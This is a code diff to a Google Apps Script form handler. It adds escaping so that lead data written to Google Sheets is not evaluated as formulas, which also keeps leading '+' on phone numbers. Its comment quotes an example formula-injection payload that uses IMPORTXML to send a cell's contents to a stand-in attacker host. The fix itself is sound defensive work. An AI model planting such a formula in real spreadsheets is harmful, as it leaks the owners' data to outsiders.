@@ -56,6 +56,25 @@ function clean_(value, max) {
   return String(value).replace(/[\x00-\x1f\x7f]/g, ' ').trim().slice(0, max || 500);
 }
 
+/** GOOGLE SHEETS EVALUATES A CELL THAT STARTS WITH = + - @ AS A FORMULA, exactly
+ *  as if it had been typed by hand. Two consequences, one cosmetic and one not:
+ *
+ *    · '+998901234567' was stored as the NUMBER 998901234567 - the leading + was
+ *      eaten, leaving the client a phone number they cannot dial or tel: link.
+ *      Observed on the first two real submissions.
+ *    · a lead whose message begins '=IMPORTXML("http://attacker/?d="&B2)' becomes
+ *      a LIVE FORMULA in the client's spreadsheet. clean_() strips control
+ *      characters; it does not strip formula prefixes, and a length cap is no
+ *      defence against a short one.
+ *
+ *  A leading apostrophe forces text. Sheets strips it from the value, so what the
+ *  client sees and what getValues() returns are both the original string - which
+ *  is why dailyDigest() below needs no matching change. */
+function cell_(value) {
+  if (value instanceof Date) return value;
+  return /^[=+\-@\t\r]/.test(String(value)) ? "'" + value : value;
+}
+
 function normalisePhone_(raw) {
   var digits = String(raw || '').replace(/[^\d+]/g, '');
   if (digits.charAt(0) === '+') return digits;
@@ -195,7 +214,7 @@ function appendRow_(data, phone) {
     clean_(data.page, 300),
     'ok',
   ];
-  sh.appendRow(values);
+  sh.appendRow(values.map(cell_));
 
   var text =
     'Yangi ariza (' + values[1] + ')\n' +
